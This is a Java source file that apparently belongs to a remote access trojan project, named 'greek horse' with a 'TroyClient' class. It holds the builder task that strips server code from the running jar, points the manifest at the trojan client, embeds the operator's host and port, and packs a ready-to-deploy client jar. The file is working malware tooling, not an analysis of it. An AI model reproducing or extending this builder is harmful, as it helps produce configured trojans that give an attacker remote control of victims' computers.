package greek.horse.server.ui.controllers.tasks;

import greek.horse.server.ui.ChatApp;
import greek.horse.server.ui.controllers.HorseController;
import javafx.application.Platform;
import javafx.scene.control.Alert;
import org.zeroturnaround.zip.ZipUtil;
import org.zeroturnaround.zip.commons.FileUtils;

import java.io.File;
import java.io.FileWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.CodeSource;
import java.util.ArrayList;
import java.util.Scanner;

public class BuildJarTask implements Runnable {

    private final File outDir;
    private final HorseController horseController;
    private final String host;
    private final String port;

    public BuildJarTask(File saveFile, HorseController horseController, String host, String port) {
        this.outDir = saveFile;
        this.horseController = horseController;
        this.host = host;
        this.port = port;
    }

    @Override
    public void run() {
        try {
            CodeSource src = ChatApp.class.getProtectionDomain().getCodeSource();
            Path temp = Files.createTempDirectory("build_temp_");
            String temp_path = temp.toFile().getPath();

            ZipUtil.unpack(new File(src.getLocation().getPath()), temp.toFile(), StandardCharsets.UTF_8);
            FileUtils.deleteDirectory(new File(temp.toFile().getPath() + File.separator + "images"));
            FileUtils.deleteDirectory(new File(temp.toFile().getPath() + File.separator + "scenes"));
            FileUtils.deleteDirectory(new File(temp.toFile().getPath() + File.separator + "javafx"));
            FileUtils.deleteDirectory(new File(temp.toFile().getPath()
                    + File.separator + "greek"
                    + File.separator + "horse"
                    + File.separator + "server"
            ));
            FileUtils.deleteDirectory(new File(temp.toFile().getPath()
                    + File.separator + "greek"
                    + File.separator + "horse"
                    + File.separator + "test"
            ));

            File meta = new File(temp_path + File.separator + "META-INF" + File.separator + "MANIFEST.MF");
            ArrayList<String> lines = new ArrayList<>();
            try (Scanner scanner = new Scanner(meta)) {
                while (scanner.hasNext()) {
                    lines.add(scanner.nextLine());
                }
            }
            String lastLine = lines.get(lines.size() - 1);
            lines.remove(lines.size() - 1);

            try (FileWriter writer = new FileWriter(meta, false)) {
                for (String l : lines) {
                    writer.append(l).append("\n");
                }
                writer.append(lastLine.replace("greek.horse.server.ui.Launcher", "greek.horse.client.TroyClient\n\n"));
                writer.flush();
            }

            try (FileWriter writer = new FileWriter(temp.toFile().getPath() + File.separator + "connection.data", false)) {
                writer.append(host).append("\n");
                writer.append(port).append("\n");
                writer.flush();
            }

            ZipUtil.pack(temp.toFile(), new File(this.outDir.getPath()));
            FileUtils.deleteDirectory(temp.toFile());

            Platform.runLater(() -> {
                this.horseController.showDialog("Success building jar", "The jar file is ready. Go check it.", Alert.AlertType.INFORMATION);
            });

        } catch (Exception e) {
            e.printStackTrace();
            Platform.runLater(() -> {
                this.horseController.showDialog("Failed to build jar", "Something went wrong. Try it again. (" + e.getMessage() + ")", Alert.AlertType.ERROR);
            });
        } finally {
            Platform.runLater(() ->{
                this.horseController.buildBtn.setDisable(false);
            });
        }


    }
}
